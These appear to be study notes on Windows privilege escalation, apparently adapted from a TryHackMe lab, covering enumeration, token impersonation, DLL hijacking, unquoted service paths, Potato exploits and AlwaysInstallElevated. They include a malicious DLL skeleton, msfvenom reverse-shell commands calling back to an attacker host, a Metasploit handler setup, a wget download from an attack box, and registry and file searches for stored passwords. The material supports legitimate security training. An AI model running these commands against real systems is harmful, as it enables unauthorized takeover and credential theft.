## Methodology
Typically, privilege escalation will require you to follow a methodology similar to the one given below: 
1.  Enumerate the current user's privileges and resources it can access.
2.  If the antivirus software allows it, run an automated enumeration script such as winPEAS or PowerUp.ps1
3.  If the initial enumeration and scripts do not uncover an obvious strategy, try a different approach (e.g. manually go over a checklist like the one provided [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md))
[Note - dir * | Unblock-File to run "start *.exe"]

### Impersonating Tokens
You can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. Let's use the incognito module that will allow us to exploit this vulnerability. Enter: _load incognito_ to load the incognito module in metasploit. Please note, you may need to use the _use incognito_ command if the previous command doesn't work. Also ensure that your metasploit is up to date.
To check which tokens are available, enter the _list_tokens -g_. We can see that the _BUILTIN\Administrators_ token is available. Use the _impersonate_token "BUILTIN\Administrators"_ command to impersonate the Administrators token. What is the output when you run the _getuid_ command?
Even though you have a higher privileged token you may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do). Ensure that you migrate to a process with correct permissions (above questions answer). The safest process to pick is the services.exe process. First use the _ps_ command to view processes and find the PID of the services.exe process. Migrate to this process using the command _migrate PID-OF-PROCESS_

### User Enumeration
Other users that can access the target system can reveal interesting information. A user account named “Administrator” can allow you to gain higher privileges, or an account called “test” can have a default or easy to guess password. Listing all users present on the system and looking at how they are configured can provide interesting information.
The following commands will help us enumerate users and their privileges on the target system.

Current user’s privileges: `whoami /priv`
List users: `net users`
List details of a user: `net user username` (e.g. `net user Administrator`)
Other users logged in simultaneously: `qwinsta` (the `query session` command can be used the same way) 
User groups defined on the system: `net localgroup`
List members of a specific group: `net localgroup groupname` (e.g. `net localgroup Administrators`)

### Collecting system information
The `systeminfo` command will return an overview of the target system. On some targets, the amount of data returned by this command can be overwhelming, so you can always grep the output as seen below:
`systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`  

In a corporate environment, the computer name can also provide some idea about what the system is used for or who the user is. The `hostname` command can be used for this purpose. Please remember that if you have proceeded according to a proper penetration testing methodology, you probably know the hostname at this stage.

### Searching files
Configuration files of software installed on the target system can sometimes provide us with cleartext passwords. On the other hand, some computer users have the unsafe habit of creating and using files to remember their passwords (e.g. passwords.txt). Finding these files can shorten your path to administrative rights or even easy access to other systems and software on the target network.
The `findstr` command can be used to find such files in a format similar to the one given below:
`findstr /si password *.txt`
Command breakdown:
`findstr`: Searches for patterns of text in files.
`/si`: Searches the current directory and all subdirectories (s), ignores upper case / lower case differences (i)
`password`: The command will search for the string “password” in files
`*.txt`: The search will cover files that have a .txt extension

The string and file extension can be changed according to your needs and the target environment, but “.txt”, “.xml”, “.ini”, “*.config”, and “.xls” are usually a good place to start.

### Patch level
Microsoft regularly releases updates and patches for Windows systems. A missing critical patch on the target system can be an easily exploitable ticket to privilege escalation. The command below can be used to list updates installed on the target system.
`wmic qfe get Caption,Description,HotFixID,InstalledOn`
WMIC is a command-line tool on Windows that provides an interface for Windows Management Instrumentation (WMI). WMI is used for management operations on Windows and is a powerful tool worth knowing. WMIC can provide more information than just installed patches. For example, it can be used to look for unquoted service path vulnerabilities we will see in later tasks. WMIC is deprecated in Windows 10, version 21H1 and the 21H1 semi-annual channel release of Windows Server. For newer Windows versions you will need to use the WMI PowerShell cmdlet. More information can be found [here](https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/07-working-with-wmi?view=powershell-7.1).

# Important - netstat -ano

### Scheduled Tasks
Some tasks may be scheduled to run at predefined times. If they run with a privileged account (e.g. the System Administrator account) and the executable they run can be modified by the current user you have, an easy path for privilege escalation can be available.
The `schtasks` command can be used to query scheduled tasks.
`schtasks /query /fo LIST /v`

###  Drivers
The `driverquery` command will list drivers installed on the target system. You will need to do some online research about the drivers listed and see if any presents a potential privilege escalation vulnerability.

### Antivirus
The first approach may require some research beforehand to learn more about service names used by the antivirus software. For example, the default antivirus installed on Windows systems, Windows Defender’s service name is windefend. The query below will search for a service named “windefend” and return its current state.
`sc query windefend`
While the second approach will allow you to detect antivirus software without prior knowledge about its service name, the output may be overwhelming.
`sc queryex type=service`

Software installed on the target system can present various privilege escalation opportunities. As with drivers, organizations and users may not update them as often as they update the operating system. You can use the `wmic` tool seen previously to list software installed on the target system and its versions. The command below will dump information it can gather on installed software.  
`wmic product`  
  
This output is not easy to read, and depending on the screen size over which you have access to the target system; it can seem impossible to find anything useful. You could filter the output to obtain a cleaner output with the command below.  
`wmic product get name,version,vendor`  
  

Be careful; due to some backward compatibility issues (e.g. software written for 32 bits systems running on 64 bits), the `wmic product` command may not return all installed programs. The target machine attached to this task will provide you with some hints. You will see shortcuts for installed software, and you will notice they do not appear in the results of the `wmic product` command. Therefore, It is worth checking running services using the command below to have a better understanding of the target system.

`wmic service list brief`

As the output of this command can be overwhelming, you can grep the output for running services by adding a `findstr` command as shown below.

`wmic service list brief | findstr  "Running"`

If you need more information on any service, you can simply use the `sc qc` command as seen below.


## DLL Hijacking
For standard desktop applications, Windows will follow one of the orders listed below depending on if the SafeDllSearchMode is enabled or not.

If **SafeDllSearchMode** is enabled, the search order is as follows:

1.  The directory from which the application loaded.
2.  The system directory. Use the **[GetSystemDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya)** function to get the path of this directory.
3.  The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.
4.  The Windows directory. Use the **[GetWindowsDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya)** function to get the path of this directory.
5.  The current directory.
6.  The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.
    

If **SafeDllSearchMode** is disabled, the search order is as follows:
1.  The directory from which the application loaded.
2.  The current directory.
3.  The system directory. Use the **[GetSystemDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya)** function to get the path of this directory.
4.  The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.
5.  The Windows directory. Use the **[GetWindowsDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya)** function to get the path of this directory.
6.  The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

For example, if our application.exe requires the app.dll file to run, it will look for the app.dll file first in the directory from which it is launched. If this does not return any match for app.dll, the search will continue in the above-specified order. If the user privileges we have on the system allow us to write to any folder in the search order, we can have a possible DLL hijacking vulnerability. An important note is that the application should not be able to find the legitimate DLL before our modified DLL.

This is the final element needed for a successful DLL Hijacking attack.

**Finding DLL Hijacking Vulnerabilities**  

Identifying DLL Hijacking vulnerabilities will require loading additional tools or scripts to the target system. Another approach could be to install the same application on a test system. However, this may not give accurate results due to version differences or target system configuration.

The tool you can use to find potential DLL hijacking vulnerabilities is Process Monitor (ProcMon). As ProcMon will require administrative privileges to work, this is not a vulnerability you can uncover on the target system. If you wish to check any software for potential DLL hijacking vulnerabilities, you will need to install the software on your test environment and conduct research there.  
The screenshot below shows you what to look for in the ProcMon interface. You will see some entries resulted in “NAME NOT FOUND”.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/2bffcc52df1b20dd298154b4da9b52ae.png)  


The last two lines in the screenshot above show that dllhijackservice.exe is trying to launch hijackme.dll in the “C:\Temp” folder but can not find this file. This is a typical case of a missing DLL file.

The second step of the attack will consist of us creating this file in that specific location. It is important that we have write permissions for any folder we wish to use for DLL hijacking. In this case, the location is the Temp folder for which almost all users have write permissions; if this was a different folder, we would need to check the permissions.

**Creating the malicious DLL file**  
As mentioned earlier, DLL files are executable files. They will be run by the executable file, and the commands they contain will be executed. The DLL file we will create could be a reverse shell or an operating system command depending on what we want to achieve on the target system or based on configuration limitations. The example below is a skeleton DLL file you can adapt according to your needs.

Skeleton Code for the Malicious DLL
```
`#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Temp\\dll.txt");
        ExitProcess(0);
    }
    return TRUE;
}
```
Leaving aside the boilerplate parts, you can see this file will execute the `whoami` command (`cmd.exe /k whoami`) and save the output in a file called "dll.txt".

The mingw compiler can be used to generate the DLL file with the command given below:
`x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll`

You can easily install the Mingw compiler using the apt install gcc-mingw-w64-x86-64 command.

We have seen earlier that the application we target searches for a DLL named hijackme.dll. This is what our malicious DLL should be named.

You can copy the C code above given for the DLL file to the AttackBox or the operating system you are using and proceed with compiling.

Once compiled, we will need to move the hijackme.dll file to the Temp folder in our target system. You can use the following PowerShell command to download the .dll file to the target system: `wget -O hijackme.dll ATTACKBOX_IP:PORT/hijackme.dll`

We will have to stop and start the dllsvc service again using the command below:
`sc stop dllsvc & sc start dllsvc`

## Unquoted Service Path Vulnerabilities
When a service starts in Windows, the operating system has to find and run an executable file. For example, you will see in the terminal output below that the "netlogon" service (responsible for authenticating users in the domain) is, in fact, referring to the C:\Windows\system32\lsass.exe binary. 

Netlogon and its binary

           `C:\Users\user>sc qc netlogon
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: netlogon
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\lsass.exe
        LOAD_ORDER_GROUP   : MS_WindowsRemoteValidation
        TAG                : 0
        DISPLAY_NAME       : Netlogon
        DEPENDENCIES       : LanmanWorkstation
        SERVICE_START_NAME : LocalSystem

C:\Users\user>`
    
In the example above, when the service is launched, Windows follows a search order similar to what we have seen in the previous task. Imagine now we have a service (e.g. srvc) which has a binary path set to C:\Program Files\topservice folder\subservice subfolder\srvc.exe

To the human eye, this path would be merely different than "C:\Program Files\topservice folder\subservice subfolder\srvc.exe". We would understand the service is trying to run srvc.exe

Windows approaches the matter slightly differently. It knows the service is looking for an executable file, and it will start looking for it. If the path is written between quotes, Windows will directly go to the correct location and launch service.exe. 

However, if the path is not written between quotes and if any folder name in the path has a space in its name, things may get complicated. Windows will append ".exe" and start looking for an executable, starting with the shortest possible path. In our example, this would be C:\Program.exe. If program.exe is not available, the second attempt will be to run topservice.exe under C:\Program Files\. If this also fails, another attempt will be made for C:\Program Files\topservice folder\subservice.exe. This process repeats until the executable is found. 

Knowing this, if we can place an executable in a location we know the service is looking for one, it may be run by the service. 

As you can understand, exploiting an unquoted service path vulnerability will require us to have write permissions to a folder where the service will look for an executable. 

**Finding Unquoted Service Path Vulnerabilities**

Tools like winPEAS and PowerUp.ps1 will usually detect unquoted service paths. But we will need to make sure other requirements to exploit the vulnerability are filled. These are;

1.  Being able to write to a folder on the path
2.  Being able to restart the service

If either of these conditions is not met, successful exploitation may not be possible. 

The command below will list services running on the target system. The result will also print out other information, such as the display name and path. 

`wmic service get name,displayname,pathname,startmode`

The command may show some Windows operating system folders. As you will not have "write" privileges on those with a limited user, these are not valid candidates.

Going over the output of this command on the target machine, you will notice that the "unquotedsvc" service has a path that is not written between quotes. 

Once we have located this service, we will have to make sure other conditions to exploit this vulnerability are met.

You can further check the binary path of this service using the command below: 

`sc qc unquotedsvc`

Once we have confirmed that the binary path is unquoted, we will need to check our privileges on folders in the path. Our goal is to find a folder that is writable by our current user. We can use accesschk.exe with the command below to check for our privileges.

`.\accesschk64.exe /accepteula -uwdq "C:\Program Files\"`

The output will list user groups with read (R) and write (W) privileges on the "Program Files" folder.

The accesschk binary is on the desktop of the target system (MACHINE_IP)
We now have found a folder we can write to. As this folder is also in the service's binary path, we know the service will try to run an executable with the name of the first word of the folder name. 

We can use msfvenom (on the AttackBox) to generate an executable. The command below will wrap Meterpreter in an executable file. 

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI or AttackBox IP Address] LPORT=[The Port to which the reverse shell will connect] -f exe > executable_name.exe`

The command above will generate a reverse shell. This means that it will try to connect back to our attacking machine. We will need to launch Metasploit and configure the handler to accept this connection. The terminal screen below shows a typical configuration. Please note that the LHOST value (attacking machine IP address, 10.9.6.195 in the example below) will be different and you may also change the LPORT (local port) if you have used a different port when generating the executable file. If the screen below seems unfamiliar, you can complete the Metasploit module to learn more about Metasploit. 

msfconsole

           `msf6 > use exploit/multi/handler 
[*] Using configured payload windows/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
payload => windows/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > set lport 8899
lport => 8899
msf6 exploit(multi/handler) > set lhost 10.9.6.195
lhost => 10.9.6.195
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.9.6.195:8899`
        

Once you have generated and moved the file to the correct location on the target machine, you will need to restart the vulnerable service.

You can use the `sc start unquotedsvc` command to start the service.

## Token Impersonation
Service accounts, briefly mentioned in the introduction task, may have a higher privilege level than the low-level user you may have. In Windows versions before Server 2019 and 10 (version 1809), these service accounts are affected by an internal man-in-the-middle vulnerability. As you may know, man-in-the-middle (MitM) attacks are conducted by intercepting network traffic. In a similar fashion, higher privileged service accounts will be forced to authenticate to a local port we listen on. Once the service account attempts to authenticate, this request is modified to negotiate a security token for the "NT AUTHORITY\SYSTEM" account. The security token obtained can be used by the user we have in a process called "impersonation". Although it has led to several exploits, the impersonation rights were not a vulnerability.  
  
In Windows versions after Server 2019 and Windows 10 (version 1809), impersonation rights were restricted. You can see below that a regular user does not have the "SeImpersonatePrivilege" privilege.

Regular User "whoami /priv" Output

           `C:\Users\user>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

C:\Users\user>`

Admin User "whoami /priv" Output

           `C:\Users\admin>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled

C:\Users\admin>`
        
Doing further research on token impersonation vulnerabilities, you will see a number of different exploits exist. These have whimsical names such as Hot Potato, Rotten Potato, Lonely Potato, Juicy Potato, etc. You will be able to decide on which "Potato" better suits your need depending on the version of the target system. While some of these exploits will run on the target system, others may require you to set up a fake server on the same network.  
  
The first of these potato exploits was "Hot Potato", and it could help you have a better understanding of the fundamental idea behind these exploits.  

Hot Potato: Steps 1 to 4

Step 1: The target system uses the Web Proxy Auto-Discovery (WPAD) protocol to locate its update server.  
Step 2: This request is intercepted by the exploit, which sends a response redirecting the target system to a port on 127.0.0.1.  
Step 3: The target system will ask for a proxy configuration file (wpad.dat).  
Step 4: A malicious wpad.dat file is sent to the target.  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/81f88d6e43b595617be991de29484c7c.png)  

  

Hot Potato: Steps 5 to 8

Step 5: The target system tries to connect to the proxy (now set by the malicious wpad.dat file sent on the previous step).  
Step 6: The exploit will ask the target system to perform an NTLM authentication.  
Step 7: The target system sends an NTLM handshake.  
Step 8: The handshake received is relayed to the SMB service with a request to create a process. This process will have the privilege level of the service targeted, which would typically be "NT AUTHORITY\SYSTEM".  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/ac443f75a1851fb178ed4ea7c85f90e6.png)

All requests are sent and received within the target system.

Microsoft published an update in the MS16-075 security bulletin to mitigate this exploit, and Hot Potato was followed by Rotten Potato. Rotten Potato uses a similar approach but leverages RPC.

Which "Potato" version you can use will vary depending on the target system's version, patch level and network connection limitation. While "Hot Potato" works within the target system, other versions may require network access over specific ports.

## Easy Ins
Privilege escalation is not always a challenge. Some misconfigurations can allow you to obtain higher privileged user access and, in some cases, even administrator access. It would help if you considered these to belong more to the realm of CTF events rather than scenarios you will encounter during real penetration testing engagements. However, if none of the previously mentioned methods works, you can always go back to these.  
  
**Scheduled Tasks**  
Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or using a binary you can modify.  
For this method to work, the scheduled task should be set to run with a user account with a higher privilege level than the one you currently have.  
  
Scheduled tasks can be listed from the command line using the `schtasks` command, using the task scheduler, or, if possible, uploading a tool such as Autoruns64.exe to the target system.  
  
**AlwaysInstallElevated**  
Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges if the installation requires administrator privileges.  
This could potentially allow us to generate a malicious MSI file that would run with admin privileges.

  
This method requires two registry values to be set. You can query these from the command line using the commands below.  
  
`reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`  
`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`  
  
Remember, to be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible.  
If these are set, you can generate a malicious .msi file using `msfvenom`, as seen below.  
  
`msfvenom -p windows/x64/shell_reverse_tcpLHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi`  
  
As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly.  
  
Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell.

Command Run on the Target System

           `C:\Users\user\Desktop>msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi`
        

**Passwords**  
We have seen earlier that looking for configuration or user-generated files containing cleartext passwords can be rewarding. There are other locations on Windows that could hide cleartext passwords.  
  
**Saved credentials:** Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials.  
`cmdkey /list`  

If you see any credentials worth trying, you can use them with the `runas` command and the `/savecred` option, as seen below.  
`runas /savecred /user:admin reverse_shell.exe`  
  
**Registry keys:** Registry keys potentially containing passwords can be queried using the commands below.  
`reg query HKLM /f password /t REG_SZ /s`  
`reg query HKCU /f password /t REG_SZ /s`  
  
**Unattend files:** Unattend.xml files helps system administrators setting up Windows systems. They need to be deleted once the setup is complete but can sometimes be forgotten on the system. What you will find in the unattend.xml file can be different according to the setup that was done. If you can find them on a system, they are worth reading.

### SysInternals
**Check for details and privileges**
```
sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
```